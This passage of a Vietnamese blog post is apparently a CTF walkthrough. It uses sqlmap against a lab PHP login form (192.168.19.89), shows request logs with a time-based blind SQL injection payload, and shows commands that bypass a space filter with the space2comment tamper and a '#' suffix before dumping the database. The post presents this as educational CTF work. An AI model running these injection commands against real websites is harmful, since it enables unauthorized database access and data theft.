<span style="color:#f92672">[</span>16:50:19<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>TRAFFIC OUT<span style="color:#f92672">]</span> HTTP request <span style="color:#f92672">[</span><span style="color:#75715e">#148]:</span>
POST /test/index.php HTTP/1.1
Host: 192.168.19.89
Accept-encoding: gzip,deflate
Cache-control: no-cache
Content-type: application/x-www-form-urlencoded; charset<span style="color:#f92672">=</span>utf-8
Accept: */*
User-agent: sqlmap/1.3.7#stable <span style="color:#f92672">(</span>http://sqlmap.org<span style="color:#f92672">)</span>
Content-length: <span style="color:#ae81ff">204</span>
Connection: close

search_user_exist&amp;username<span style="color:#f92672">=</span>%5C&amp;name<span style="color:#f92672">=</span>OR%2F%2A%2A%2F1%3D1%23%27%20AND%203190%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2869%29%7C%7CCHR%2876%29%7C%7CCHR%28103%29%7C%7CCHR%2877%29%2C5%29%20AND%20%27gzMg%27%3D%27gzMg

<span style="color:#f92672">[</span>16:50:19<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>TRAFFIC IN<span style="color:#f92672">]</span> HTTP response <span style="color:#f92672">[</span><span style="color:#75715e">#148] (200 OK):</span>
Date: Wed, <span style="color:#ae81ff">28</span> Aug <span style="color:#ae81ff">2019</span> 09:50:19 GMT
Server: Apache/2.4.39 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1c PHP/7.3.6
X-Powered-By: PHP/7.3.6
Content-Length: <span style="color:#ae81ff">14</span>
Connection: close
Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
URI: http://192.168.19.89:80/test/index.php

h4x0r detected
</code></pre></div></li>
<li>
<p>Theo quan sát thì PAYLOAD đang sai, sqlmap sử dụng cả <code>OR/**/1=1#</code> của <code>name</code> nên nó bị sai, và <code>space</code> đang được sử dụng. Bây giờ mình phải chuyển tất cả <code>space</code> về <code>/**/</code>. Ở <code>sqlmap</code> có 1 tùy chọn rất hay là <code>tamper</code>. Để hiển thị danh sách các <code>tamper</code> có trong <code>sqlmap</code> thì sử dụng câu lệnhluôn. Mình hoàn toàn có thể custom lại <code>tamper</code> này của <code>sqlmap</code>.</p>
<pre><code>sqlmap --list-tampers
</code></pre></li>
<li>
<p>Thấy có <code>* space2comment.py - Replaces space character (' ') with comments '/**/'</code> nên sử dụng luôn. Vậy câu lệnh tiếp theo sẽ là:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u http://192.168.19.89/test/index.php --data <span style="color:#e6db74">&#34;search_user_exist&amp;username=\&amp;name=OR/**/1=1#&#34;</span> -p name --string<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;User exist&#34;</span> --tamper<span style="color:#f92672">=</span>space2comment.py
</code></pre></div></li>
<li>
<p>Kiểm tra kết quả thì vẫn chưa được. Câu lệnh query vẫn đang sai. Do <code>sqlmap</code> nối luôn <code>OR/**/1=1#</code> vào payload nên đang bị sai. Chúng ta xóa nó đi và tiến hành chạy lại.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u http://192.168.19.89/test/index.php --data <span style="color:#e6db74">&#34;search_user_exist&amp;username=\&amp;name=OR/**/1=1#&#34;</span> -p name --string<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;User exist&#34;</span> --tamper<span style="color:#f92672">=</span>space2comment.py
</code></pre></div></li>
<li>
<p>Vẫn chưa được, kiểm tra lại với option <code>-v 6</code> thì thấy rằng PAYLOAD đang sử dụng dấu comment là dấu <code>--</code>, mình phải đổi dấu <code>--</code> thành dấu <code>#</code>. Sử dụng tùy chọn <code>--suffix=&quot;#&quot;</code> thì cuối mỗi PAYLOAD sẽ là dấu <code>#</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u http://192.168.19.89/test/index.php --data <span style="color:#e6db74">&#34;search_user_exist&amp;username=\&amp;name=OR/**/1=1#&#34;</span> -p name --string<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;User exist&#34;</span> --tamper<span style="color:#f92672">=</span>space2comment.py --suffix<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#&#34;</span><span style="color:#e6db74">`</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">    Parameter: name <span style="color:#f92672">(</span>POST<span style="color:#f92672">)</span>
        Type: time-based blind
        Title: MySQL &gt;<span style="color:#f92672">=</span> 5.0.12 AND time-based blind <span style="color:#f92672">(</span>query SLEEP<span style="color:#f92672">)</span>
        Payload: search_user_exist&amp;username<span style="color:#f92672">=</span><span style="color:#ae81ff">\&amp;</span>name<span style="color:#f92672">=</span> AND <span style="color:#f92672">(</span>SELECT <span style="color:#ae81ff">1987</span> FROM <span style="color:#f92672">(</span>SELECT<span style="color:#f92672">(</span>SLEEP<span style="color:#f92672">(</span>5<span style="color:#f92672">)))</span>ApsW<span style="color:#f92672">)</span><span style="color:#75715e">#</span>
    ---
    <span style="color:#f92672">[</span>17:02:55<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> changes made by tampering scripts are not included in shown payload content<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>
    <span style="color:#f92672">[</span>17:02:55<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> the back-end DBMS is MySQL
    web application technology: Apache 2.4.39, PHP 7.3.6
    back-end DBMS: MySQL &gt;<span style="color:#f92672">=</span> 5.0.12
    </code></pre></div>
</li>
<li>
<p>Đã hoạt động rồi. DB sử dụng MySQL, giờ chúng ta sử dụng lệnh <code>--dump-all</code> lấy tên DB và Table của dữ liệu ta cần lấy.</p>
<pre><code>sqlmap -u http://192.168.19.89/test/index.php --data &quot;search_user_exist&amp;username=\&amp;name=&quot; -p name --string=&quot;User exist&quot; --suffix=&quot;#&quot; --tamper=space2comment.py --dbms=mysql -D --dumpall-all
</code></pre></li>
<li>
<p>Có thể sử dụng các tùy chọn khác để lấy dữ liệu từ từ như <code>--current-db</code> chọn các dữ liệu mong muốn để lấy ra ngoài. D</p>
</li>
</ul>
<h2 id="kết-luận">Kết luận<a hidden class="anchor" aria-hidden="true" href="#kết-luận">#</a></h2>
<ul>
<li><code>sqlmap</code> rất mạnh, hầu như có thể tấn công vào bất cứ web nào có dính lỗi SQL Injection.</li>
<li>Vài điều lưu ý: Nếu sử dụng <code>sqlmap</code> mà k thấy ra kết quả thì sử dụng option <code>-v</code> để xem PAYLOAD truyền vào đúng ý mình chưa. Kiên trì thì sẽ hái được quả ngọt :D</li>
</ul>

</div>
  <footer class="post-footer">
    <nav class="paginav">
      <a class="prev" href="https://minhtuanact.github.io/post/tao-vo-van-lenh-shell-chiem-quyen-truy-cap-bang-cong-cu-shellpop-tren-linux/">
        <span class="title">« Prev Page</span>
        <br>
        <span>Tạo Vô Vàn Lệnh Shell Chiếm Quyền Truy Cập Bằng Công Cụ Shellpop Trên Linux</span>
      </a>
    </nav>



<div class="share-buttons">
    <a target="_blank" rel="noopener noreferrer" aria-label="share Sử Dụng Công Cụ SQLMAP với Blind SQL Injection Cho 1 Bài CTF on twitter"
        href="https://twitter.com/intent/tweet/?text=S%e1%bb%ad%20D%e1%bb%a5ng%20C%c3%b4ng%20C%e1%bb%a5%20SQLMAP%20v%e1%bb%9bi%20Blind%20SQL%20Injection%20Cho%201%20B%c3%a0i%20CTF&amp;url=https%3a%2f%2fminhtuanact.github.io%2fpost%2fsu-dung-cong-cu-sqlmap-voi-blind-sql-injection-cho-1-bai-ctf%2f&amp;hashtags=">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Sử Dụng Công Cụ SQLMAP với Blind SQL Injection Cho 1 Bài CTF on linkedin"
        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fminhtuanact.github.io%2fpost%2fsu-dung-cong-cu-sqlmap-voi-blind-sql-injection-cho-1-bai-ctf%2f&amp;title=S%e1%bb%ad%20D%e1%bb%a5ng%20C%c3%b4ng%20C%e1%bb%a5%20SQLMAP%20v%e1%bb%9bi%20Blind%20SQL%20Injection%20Cho%201%20B%c3%a0i%20CTF&amp;summary=S%e1%bb%ad%20D%e1%bb%a5ng%20C%c3%b4ng%20C%e1%bb%a5%20SQLMAP%20v%e1%bb%9bi%20Blind%20SQL%20Injection%20Cho%201%20B%c3%a0i%20CTF&amp;source=https%3a%2f%2fminhtuanact.github.io%2fpost%2fsu-dung-cong-cu-sqlmap-voi-blind-sql-injection-cho-1-bai-ctf%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Sử Dụng Công Cụ SQLMAP với Blind SQL Injection Cho 1 Bài CTF on reddit"
        href="https://reddit.com/submit?url=https%3a%2f%2fminhtuanact.github.io%2fpost%2fsu-dung-cong-cu-sqlmap-voi-blind-sql-injection-cho-1-bai-ctf%2f&title=S%e1%bb%ad%20D%e1%bb%a5ng%20C%c3%b4ng%20C%e1%bb%a5%20SQLMAP%20v%e1%bb%9bi%20Blind%20SQL%20Injection%20Cho%201%20B%c3%a0i%20CTF">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Sử Dụng Công Cụ SQLMAP với Blind SQL Injection Cho 1 Bài CTF on facebook"
        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fminhtuanact.github.io%2fpost%2fsu-dung-cong-cu-sqlmap-voi-blind-sql-injection-cho-1-bai-ctf%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Sử Dụng Công Cụ SQLMAP với Blind SQL Injection Cho 1 Bài CTF on whatsapp"
        href="https://api.whatsapp.com/send?text=S%e1%bb%ad%20D%e1%bb%a5ng%20C%c3%b4ng%20C%e1%bb%a5%20SQLMAP%20v%e1%bb%9bi%20Blind%20SQL%20Injection%20Cho%201%20B%c3%a0i%20CTF%20-%20https%3a%2f%2fminhtuanact.github.io%2fpost%2fsu-dung-cong-cu-sqlmap-voi-blind-sql-injection-cho-1-bai-ctf%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Sử Dụng Công Cụ SQLMAP với Blind SQL Injection Cho 1 Bài CTF on telegram"
        href="https://telegram.me/share/url?text=S%e1%bb%ad%20D%e1%bb%a5ng%20C%c3%b4ng%20C%e1%bb%a5%20SQLMAP%20v%e1%bb%9bi%20Blind%20SQL%20Injection%20Cho%201%20B%c3%a0i%20CTF&amp;url=https%3a%2f%2fminhtuanact.github.io%2fpost%2fsu-dung-cong-cu-sqlmap-voi-blind-sql-injection-cho-1-bai-ctf%2f">
        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28">
            <path
                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
        </svg>
    </a>
</div>

  </footer>
</article>
    </main><footer class="footer">
    <span>&copy; 2021 <a href="https://minhtuanact.github.io/">minhtuanact | Blog</a></span>
    <span>&middot;</span>
    <span>Powered by <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a></span>
    <span>&middot;</span>
    <span>Theme <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a></span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)">
    <button class="top-link" id="top-link" type="button" accesskey="g">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
            <path d="M12 6H0l6-6z" />
        </svg>
    </button>
</a>



<script defer src="/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
    onload="hljs.initHighlightingOnLoad();"></script>
<script>
    window.onload = function () {
        if (localStorage.getItem("menu-scroll-position")) {
            document.getElementById('menu').scrollLeft = localStorage.getItem("menu-scroll-position");
        }
    }

    function menu_on_scroll() {
        localStorage.setItem("menu-scroll-position", document.getElementById('menu').scrollLeft);
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>

</body>

</html>
